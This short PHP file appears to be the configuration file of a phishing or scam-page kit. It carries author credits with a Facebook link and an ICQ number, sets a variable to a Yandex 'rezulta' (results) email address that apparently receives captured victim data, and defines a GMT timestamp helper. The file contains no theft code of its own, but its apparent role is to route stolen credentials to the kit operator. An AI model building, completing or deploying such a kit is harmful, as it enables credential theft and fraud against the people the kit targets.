<?php
	/*
	/ -> All Created By AdEm AouFi
	/ -> https://www.facebook.com/ad.emaoufi.524
	/ -> ICQ : 746200545
	*/
	

	// ================================= //

	$yours = "spam.rezulta@yandex.com";
	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}

?>